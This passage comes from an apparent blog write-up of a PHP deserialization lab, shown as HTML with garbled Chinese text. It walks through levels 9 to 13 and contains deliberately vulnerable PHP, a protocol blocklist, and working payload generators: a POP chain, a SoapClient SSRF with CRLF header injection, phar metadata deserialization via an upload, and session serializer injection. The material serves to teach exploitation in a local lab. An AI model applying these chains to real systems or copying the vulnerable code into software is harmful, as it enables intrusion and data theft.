class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)      // éœ€è¦$<span class="hljs-title">value</span> = <span class="hljs-title">flag</span>.<span class="hljs-title">php</span> æœ€åä¸€æ­¥</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// éœ€è¦$var = flag.php   å€’æ•°ç¬¬äºŒæ­¥,å½“ç±»è¢«å½“åšå‡½æ•°æ‰§è¡Œæ—¶</span><br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">// å¯¹è±¡å½“åšå­—ç¬¦ä¸²æ‰§è¡Œæ—¶</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;  <span class="hljs-comment">// è¿›å…¥Testå¯¹è±¡ä¸­,å› ä¸ºç±»ä¸­æ²¡æœ‰sourceè¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥ä¼šè¿›å…¥__get()ä¸­å¯»æ‰¾æ˜¯å¦æœ‰å…¶ä»–å±æ€§</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// ååºåˆ—åŒ–æ—¶ä¼˜å…ˆè°ƒç”¨</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;         <span class="hljs-comment">// è°ƒç”¨__toString()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;    <span class="hljs-comment">// åœ¨å¯¹è±¡çš„å¤–éƒ¨è·å–ç§æœ‰æˆå‘˜å±æ€§çš„å€¼æ—¶æ‰§è¡Œ</span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;       <span class="hljs-comment">//</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();         <span class="hljs-comment">// è°ƒç”¨__invoke()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Modifier();<span class="hljs-comment">// å…ˆå®ä¾‹åŒ–ä¸‰ä¸ªç±»</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Show();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Test();<br><br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-variable">$b</span>;<span class="hljs-comment">// è°ƒç”¨__toString()</span><br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$c</span>;<span class="hljs-comment">// è°ƒç”¨__get()</span><br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<span class="hljs-comment">// è°ƒç”¨__invoke()è¿™éƒ¨å¯ä»¥æ”¾åœ¨ç¬¬ä¸€æ­¥è¿›è¡Œèµ‹å€¼æ“ä½œ</span><br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">// è¾“å‡ºï¼šO:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot; Modifier var&quot;;N;&#125;&#125;&#125;</span><br><span class="hljs-comment">// æ³¨æ„ç§æœ‰å˜é‡çš„ä¸å¯ä»¥è§å­—ç¬¦</span><br><span class="hljs-comment">// æ›´æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼šO:4:\&quot;Show\&quot;:2:&#123;s:6:\&quot;source\&quot;;r:1;s:3:\&quot;str\&quot;;O:4:\&quot;Test\&quot;:1:&#123;s:1:\&quot;p\&quot;;O:8:\&quot;Modifier\&quot;:1:&#123;s:13:\&quot;\00Modifier\00var\&quot;;s:8:\&quot;flag.php\&quot;;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/11.png"></p><h4 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$c</span> -&gt; daydream();<span class="hljs-comment">// è°ƒç”¨çš„æ˜¯åŸç”Ÿç±»ä¸­åŸºæœ¬ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå»æ‰§è¡Œ__call()</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span><br><span class="hljs-comment">flag.php</span><br><span class="hljs-comment">$flag=&quot;*&quot;;</span><br><span class="hljs-comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="hljs-comment">$pass = $_POST[&#x27;pass&#x27;];</span><br><span class="hljs-comment">if(isset($pass) and isset($user))&#123;</span><br><span class="hljs-comment">if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span><br><span class="hljs-comment">file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹é¢˜ç›®æç¤ºï¼Œè¿™å…³æ˜¯<code>PHP</code>åŸç”Ÿç±»çš„ååºåˆ—åŒ–</p><p>åˆ©ç”¨<code>SoapClient</code>è¿™ä¸ªåŸç”Ÿç±»ï¼Œåœ¨è°ƒç”¨åŸç”Ÿç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œä¼šè½¬è€Œæ‰§è¡Œ<code>__call()</code></p><p>ç„¶åå†é…åˆä¸ŠCRLFæ³¨å…¥å»æœ€ç»ˆå®ç°<code>flag.php</code>æ–‡ä»¶çš„æ­£å¸¸æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$post</span> = <span class="hljs-string">&quot;pass=password&quot;</span>;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-comment">#    &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1:9999&#x27;,</span><br>    <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/php/level10/flag.php&#x27;</span>,<span class="hljs-comment">// è®¾å®šè®¿é—®åœ°å€</span><br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;mechoy&#x27;</span>,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt; <span class="hljs-variable">$user_agent</span> . <span class="hljs-string">&quot;\r\nContent-Type: application/x-www-form-urlencoded&quot;</span> . <span class="hljs-string">&quot;\r\nContent-Length:&quot;</span> . (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post</span>) . <span class="hljs-string">&quot;\r\n\r\n&quot;</span> . <span class="hljs-variable">$post</span>,<br>    ));<span class="hljs-comment">// Content-Type: application/x-www-form-urlencodedï¼Œè¿™ä¸ªå¤´å¿…é¡»è¦æœ‰ï¼Œå› ä¸ºå‘é€çš„æ˜¯postæ•°æ®åŒ…</span><br><br><span class="hljs-variable">$a</span> =  serialize(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">/*è¾“å‡º:</span><br><span class="hljs-comment">O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A6%3A%22mechoy%22%3Bs%3A8%3A%22location%22%3Bs%3A37%3A%22http%3A%2F%2F127.0.0.1%2Fphp%2Flevel10%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A90%3A%22admin%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Apass%3Dpassword%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/12.png"></p><h4 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br><span class="hljs-keyword">echo</span> md5_file(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowedExs</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br><span class="hljs-variable">$temp</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br><span class="hljs-variable">$extension</span>=end(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/gif&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/jpeg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/jpg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/pjpeg&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/x-png&quot;</span><br>    ||(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>])==<span class="hljs-string">&quot;image/png&quot;</span><br>    &amp;&amp;(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>])&lt;<span class="hljs-number">204800</span><br>    &amp;&amp;in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowedExs</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é”™è¯¯ï¼š&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>].<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶å‚¨å­˜åœ¨&quot;</span>.<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;mybe hack?&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆåœ¨level11ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªuploadæ–‡ä»¶å¤¹ï¼Œç”¨äºä¸Šä¼ æ–‡ä»¶</p><p>ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆä¸€ä¸ª<code>phar</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;1.phar&quot;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> TestObject();<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>ç”±äºuploadæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹æ–‡ä»¶åç¼€ï¼Œè¿™é‡Œæ›´æ”¹ä¸ºpng</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/14.png" style="zoom:60%;"><p>å†è®¿é—®<code>index.php</code>ï¼Œé€šè¿‡pharåè®®è®¿é—®<code>upload/2.png</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/15.png"></p><h4 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$boo1</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$black_list</span>=[<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;glob&#x27;</span>,<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;ftp&#x27;</span>,<span class="hljs-string">&#x27;zip&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>,<span class="hljs-string">&#x27;ftps&#x27;</span>,<span class="hljs-string">&#x27;phar&#x27;</span>];<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$black_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>)&#123;<span class="hljs-comment">// é™åˆ¶äº†åè®®</span><br><span class="hljs-variable">$front</span>=substr(<span class="hljs-variable">$filename</span>,<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$item</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$front</span>==<span class="hljs-variable">$item</span>)&#123;<br><span class="hljs-variable">$boo1</span>=<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$boo1</span>)&#123;<br><span class="hljs-keyword">echo</span> md5_file(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>uploadè·Ÿåˆšæ‰çš„æ²¡æœ‰å˜åŒ–</p><p>è¿™å…³åªæ˜¯é™åˆ¶äº†åè®®ï¼Œå…¶ä»–çš„æ›´ä¸Šä¸€å…³ç›¸åŒ</p><p>phpåè®®å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/16.png"></p><h4 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h4><p>ç¯å¢ƒé…ç½®ï¼š</p><ul><li><code>PHP5.6.9</code></li><li><code>session.auto_start=0;</code></li><li><code>session.serialize_handler = php;</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-keyword">$this</span>-&gt;her=md5(rand(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name===<span class="hljs-keyword">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># hint.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™å…³ä¸»è¦æ˜¯è€ƒå¯Ÿ<code>php</code>ä¸­ï¼Œ<code>session</code>ç›¸å…³çš„ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># wp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-keyword">$this</span>-&gt;her=md5(rand(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name===<span class="hljs-keyword">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Flag();<br><span class="hljs-variable">$b</span> =  serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment"># unserialize($b); æµ‹è¯•èƒ½å¦æˆåŠŸ</span><br><span class="hljs-comment">// è¾“å‡ºï¼šO:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®<code>hint.php</code>ï¼Œä¼ å…¥å‚æ•°<code>a</code>ï¼Œåˆ‡è®°åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²å‰åŠ  <code>|</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/17.png"></p><p>å†è®¿é—®<code>index.php</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/18.png"></p><h4 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 